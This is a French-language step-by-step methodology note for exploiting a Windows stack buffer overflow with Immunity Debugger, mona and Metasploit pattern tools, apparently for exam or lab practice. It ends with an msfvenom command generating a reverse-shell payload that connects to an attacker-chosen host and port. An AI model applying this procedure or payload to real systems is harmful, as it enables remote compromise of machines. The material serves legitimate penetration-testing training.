```ad-note tips
Dans Immuniyy Debugger, on peut retourner à l'affichage principale en cliquant sur l'onglet **Window --> CPU**
Il faut lancer les scripts avec PYTHON3
```


## Mona Configuration
##### Installation de mona
https://github.com/corelan/mona
Mettre mona.py dans le répertoire:
`C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands`

### Mona Configuration
Configuration du working folder :
```
!mona config -set workingfolder c:\mona\%p
```

## Lister les commandes

On se connecte à l'application avec `nc -nv IP Port` puis on essaie de voir qu'elle sont les commandes de l'application qui nous permettent d'envoyer des données.

## 1 - Fuzzing

La première étape est de déterminer la commande vulnérable en faisant crash l'application.
Dans le script **PARAMETER.py** on modifie l'**IP** et le **Port**, et dans le script **1_segfault.py** on modifie le **Prefix**.
On attache et lance l'application dans Immunity puis on exécute le script.
On note l'offset trouvé dans la variable **offset_eip** de **PARAMETER.py**.

## 2 - Offset

On génère un paterne avec metasploit :
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <String_Length>

buf += ("<PATTERN>")
```

Mettre l'output dans la variable **buf** de **2_find_offset.py** et exécuter le script.

Lorsque l'application crash :
- on note la valeur de EIP en faisant **clic droit sur la valeur de l'EIP --> copy selection to Clipboard**
- on note la valeur de ESP en faisant **clic droit sur ESP --> Follow in stack --> Clic droit sur la ligne surligner en bleu  dans fenêtre en bas à droite (qui correspond au registre ESP) --> Copy to clipboard**.

Puis on récupère l'offset de l'EIP et de l'ESP avec la commande : 

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <value>
```

On peut aussi trouver l'offset EIP et ESP avec la commande : `!mona findmsp`

On note la valeur de l'offset retournée par cette commande dans la variable **offset_eip** et **offset_esp de **PARAMETER.py**.

## 3 - Control the EIP

Cette étape consiste à vérifier si l'offset trouvé est le bon, en écrivant une suite de caractères B dans l'EIP.

On exécute le script.
On modifie aussi la variable **buf_totlen** dans **PARAMETER.py** pour que la taille corresponde à l'offset qui à fait crash l'application plus 50 pour laisser de la marge au shellcode.

Dans Immunity si l'EIP contient une suite de caractères B, et que l'ESP pointe vers un emplacement qui contient CCCCDDDDDD... alors les offsets trouvés sont les bons.

## 4 - Bad Chars

On créer dans mona une liste de caractères en excluant directement x00 qui est bad chars par défaut (Il correspond au caractère ASCII fin de string)

```
!mona bytearray -cpb "\x00"
```

On exécute le script **4_find_badchars.py**.
On trouve les badchars en comparant ESP avec le fichier généré par mona :

```
!mona compare -a ESP -f <path_to__bytearray.bin>
```

On ajoute les badchars trouvé par mona dans la variable **bad_chars** de **PARAMETER.py**.

On régénère à nouveau avec mona un **bytearray** en ajoutant le bad chars trouvé :
```
Exemple :
!mona bytearray -cpb "\x00\x0a"
```

Puis on reproduit cette action jusqu'à se qu'il n'y ai plus de bad characters.

## 5 - Confirm badchars & find a JMP ESP instruction

### a. Confirm badchars

S'assurer que les badchars identifié sont dans le fichier **PARAMETER.py**.
Regénérer une sequence badchars avec mona en intégrant tous les badchars trouvé :
```
!mona bytearray -cpb "\x00\x04\x05\xA2\xA3\xAC\xAD\xC0\xC1\xEF\xF0"
```

Comparer le fichier `bytearray.bin` avec le buffer pour être sure qu'ils sont pareil.
```
!mona compare -a ESP -f <file_with_bad_chars>
!mona compare -a <WHATEVER ADDRESS> -f <file_with_bad_chars>
```

Si il n'y a plus de badchars, mona doit afficher un statuts **unmodified** et on doit avoir un message dans la console qui dit :  **!!! Hoooray, normal shellcode unmodified !!!**

### b. Find a JMP ESP

On demande à mona de trouver une instruction **JMP ESP** qui permet au processeur d'exécuter ce que nous avons mis dans le stack.

```
!mona jmp -r esp -cpb "<bad_chars>"       formatted like this : "\x00\x01"
```

Placer l'adresse retournée dans la variable **ptr_jmp_esp** dans **PARAMETER.py**.

## 6 - Pop calc

Ce script permet de confirmer l'execution de code sur la victime. Cela peut être utilisé pour validé le contenu de l'exploit.

On génère un shellcode avec msfvenom qui permet de pop un calculatrice :
```
msfvenom -p windows/exec -b '<badchars>' -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
```

Insérer l'output (variable python `shellcode_calc`) dans le script **6_pop_calc.py**.

On exécute le script, une calculatrice devrait pop sur la machine victime.

## 7 - Reverse Shell

Maintenant, on peut craft n'importe quel shellcode du moment qu'on respecte les bad chars.

```
msfvenom -p windows/shell_reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_Port> -f py -b '<badchars>' -e x86/shikata_ga_nai --var-name shellcode
Attention : Si le decodeur ne fonctionne pas, on peut enlever "-e x86/shikata_ga_nai" de la commande.
```


Insérer l'output (python variable `shellcode`) dans le script **7_exploit.py**
